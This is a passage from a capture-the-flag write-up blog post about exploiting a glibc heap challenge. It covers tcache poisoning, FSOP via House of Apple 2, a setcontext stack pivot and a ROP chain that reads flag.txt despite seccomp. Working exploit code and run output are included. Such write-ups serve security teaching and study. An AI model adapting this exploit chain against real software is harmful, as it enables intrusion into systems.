+</div><p>Notice i wrote <code>pheader</code> into <code>fd,bk</code> pointers of the chunk <code>P</code> after allocting it once thats because when i try to allocate it again and glibc calls <code>unlink_chunk()</code> again on P , it needs to pass the check <code>fd-&gt;bk == p , bk-&gt;fd == p</code> otherwise <code>unlink_chunk()</code> will throw an error.</p>
+<p>next we free chunk <code>A,P</code> which makes them consolidate in the heap .This newly consolidated chunk covers the memory where <code>P</code> used to live.</p>
+<h2 id="overlapping-chunks--tcache-poisoning">Overlapping chunks &amp; Tcache Poisoning
+</h2><p>Now that we have two pointers to the same physical chunk, we can finally make the overlap useful.<br>
+The goal of this stage is to turn our heap overlap into an arbitrary allocation primitive using tcache poisoning. In particular, we want a future <code>malloc(0x400)</code> to return <code>_IO_2_1_stdout_</code>.</p>
+<p>Recall that <code>P</code> is located <code>0x410</code> bytes into the consolidated region created by merging <code>A</code> and <code>P</code>.<br>
+Since we can now control the entire consolidated chunk, we can write a fake chunk header at the old location of <code>P</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x928</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x410</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="c1"># make fake chunk at P through the consolidated chunk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1"># free F as a dummy chunk and add it to tcache</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="c1"># free the fake chunk and add it to tcache</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We set <code>prevsize=0</code>, <code>size=0x411</code> and then free the fake chunk which puts it into  tcache . now this freed chunk is still acessible from our consolidated memory so we do the classic tcache poisoning by writing the mangled ptr we want malloc to return to us in the <code>next</code> ptr of the tcache chunk</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;_IO_2_1_stdout_&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop_start_addr</span><span class="o">=</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2a0</span><span class="o">+</span><span class="mh">0x440</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop_chain</span><span class="o">=</span><span class="n">construct_rop_chain</span><span class="p">(</span><span class="n">rop_start_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x928</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x410</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">((</span><span class="n">p_user</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span><span class="o">^</span><span class="n">stdout</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;flag.txt&#39;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">rop_chain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;DUMMY&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stdout_payload</span><span class="o">=</span><span class="n">construct_stdout_payload</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="n">stdout_payload</span><span class="p">)</span> <span class="c1"># Alloc _IO_2_1_stout_ </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We are trying to malloc <code>_IO_2_1_stdout_</code> because that way we can perform FSOP which leads us to control flow hijacking.</p>
+<p>As we know the heap_base we can calc the addresses of the data we setup at the heap , so we are also utilizing this chunk&rsquo;s memory to place our ROP chain and the string &ldquo;flag.txt&rdquo; in it.</p>
+<h2 id="fsop---house-of-apple-2--setcontext--rop">FSOP - House of Apple 2 | setcontext | ROP
+</h2><p>There are plenty of other good blogs which explain house of apple 2 so i am not gonna explain it (ps i am tired of writing this post)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">construct_stdout_payload</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl"><span class="n">_IO_wfile_jumps</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;_IO_wfile_jumps&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">setcontext</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;setcontext&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x299d2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># setcontext --&gt; +0x78 : rbp , +0xa8:rip</span>
+</span></span><span class="line"><span class="cl"><span class="n">fp</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>   
+</span></span><span class="line"><span class="cl">           <span class="mh">0x68</span><span class="p">:</span> <span class="n">setcontext</span><span class="p">,</span> <span class="c1"># _wide_data-&gt;vtable-&gt;wdoallocate</span>
+</span></span><span class="line"><span class="cl">           <span class="mh">0x78</span><span class="p">:</span><span class="n">rop_start_addr</span><span class="o">-</span><span class="mh">0x8</span><span class="p">,</span> <span class="c1"># rbp    -0x8 to account for pop(rbp) in leave;ret</span>
+</span></span><span class="line"><span class="cl">           <span class="mh">0x88</span><span class="p">:</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0xE8</span><span class="o">+</span><span class="mh">0x90</span><span class="p">,</span> <span class="c1">#lock</span>
+</span></span><span class="line"><span class="cl">           <span class="mh">0xa0</span><span class="p">:</span><span class="n">stdout</span><span class="p">,</span> <span class="c1">#_wide_data</span>
+</span></span><span class="line"><span class="cl">           <span class="mh">0xa8</span><span class="p">:</span><span class="n">leave_ret</span><span class="p">,</span> <span class="c1"># rip </span>
+</span></span><span class="line"><span class="cl">           <span class="mh">0xd8</span><span class="p">:</span><span class="n">_IO_wfile_jumps</span><span class="p">,</span> <span class="c1"># vtable</span>
+</span></span><span class="line"><span class="cl">           <span class="mh">0xE0</span><span class="p">:</span> <span class="n">stdout</span> <span class="c1"># wide_data-&gt;vtable</span>
+</span></span><span class="line"><span class="cl">       <span class="p">},</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x00&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">stdout_payload</span><span class="o">=</span><span class="n">construct_stdout_payload</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="n">stdout_payload</span><span class="p">)</span> <span class="c1"># Alloc _IO_2_1_stout_</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Recall because of seccomp we couldnt do the usual <code>system(/bin/sh)</code> otherwise we could have just called it using this fsop on stdout , so to achieve ROP we can use <code>setcontext</code> which lets us arbitrarily set all the registers which we can then use to stack pivot on the rop chain we set up at the heap.</p>
+<p>From the assembly dump of <code>setcontext</code> function we see that <code>+0xa8</code> is the offset for <code>rip</code> and <code>+0x78</code> is the offset for <code>rbp</code> in the <code>ucontext_t</code> argument that <code>setcontext</code> needs. so we setup the payload according to that and choose <code>rip=leave;ret</code> and <code>rbp=rop_start_addr-0x8</code> which will stack pivot to our rop chain</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">construct_rop_chain</span><span class="p">(</span><span class="n">rop_start_addr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">   <span class="n">rop</span><span class="o">=</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">poprdi</span><span class="o">=</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span><span class="s1">&#39;ret&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl">   <span class="n">poprsi</span><span class="o">=</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rsi&#39;</span><span class="p">,</span><span class="s1">&#39;ret&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl">   <span class="n">xchg_edx_eax</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x11ea8a</span>
+</span></span><span class="line"><span class="cl">   <span class="n">poprax</span><span class="o">=</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rax&#39;</span><span class="p">,</span><span class="s1">&#39;ret&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl">   <span class="n">syscall</span><span class="o">=</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;syscall&#39;</span><span class="p">,</span><span class="s1">&#39;ret&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl">   <span class="n">poprcx</span><span class="o">=</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rcx&#39;</span><span class="p">,</span><span class="s1">&#39;ret&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl">   <span class="n">sendfile</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;sendfile&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">       <span class="n">poprdi</span><span class="p">,</span><span class="n">rop_start_addr</span><span class="o">-</span><span class="mh">0x10</span><span class="p">,</span><span class="n">poprsi</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">poprax</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">syscall</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">       <span class="n">poprdi</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">poprsi</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">poprax</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">xchg_edx_eax</span><span class="p">,</span><span class="n">poprcx</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="n">sendfile</span>
+</span></span><span class="line"><span class="cl">       <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">payload</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now to trigger the payload we needn&rsquo;t call <code>exit()</code> as <code>stdout</code> will try to output something after our input so <code>_IO_wfile_overflow</code> will get called internally which will trigger our exploit.</p>
+<h2 id="end">END
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">python3</span> <span class="n">sol2</span><span class="o">.</span><span class="n">py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">local</span> <span class="n">process</span> <span class="s1">&#39;/home/parth/ctfs/omni/main_patched&#39;</span><span class="p">:</span> <span class="n">pid</span> <span class="mi">7259</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Libc</span> <span class="n">base</span> <span class="p">:</span> <span class="mh">0x723b0f200000</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Heap</span> <span class="n">base</span> <span class="p">:</span> <span class="mh">0x604dba822000</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="mi">111</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="s1">&#39;./libc.so.6&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">omniCTF</span><span class="p">{</span><span class="n">DEMO_FLAG</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>At last a small debugging detour <br>
+At first i was trying to call libc <code>open()</code> wrapper in the rop but due to my string &ldquo;flag.txt&rdquo; being just below the rop chain it was being overwritten by the newly created stack frame of <code>open()</code> so i switched to the syscall version. This could have been fixed easily but then i would have to move the string elsewhere and change the offsets and i was too lazy to do it.</p>
+<p>You can find the full exploit script <a class="link" href="https://github.com/Velobobo/ctf-writeups/blob/main/Omnictf-2026/nullshui/solve.py"  target="_blank" rel="noopener"
+    >here</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/blog/tags/heap/">Heap</a>
+        
+            <a href="/blog/tags/fsop/">Fsop</a>
+        
+            <a href="/blog/tags/ctf/">Ctf</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/blog/post/byu-2026-heap2win/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ByuCTF 2026 - Heap2Win</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/blog/post/nullcon-2025-fotispy6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NullConCTF 2025 - Fotispy6</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/blog/post/malta-2025-login/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MaltaCTF 2025 - Login</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/blog/post/l3ak-2025-chunkythreads/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">L3AKCTF 2025 - ChunkyThreads</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/blog/post/l3ak-2025-safegets/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">L3AKCTF 2025 - SafeGets</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Velobobo&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/blog/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
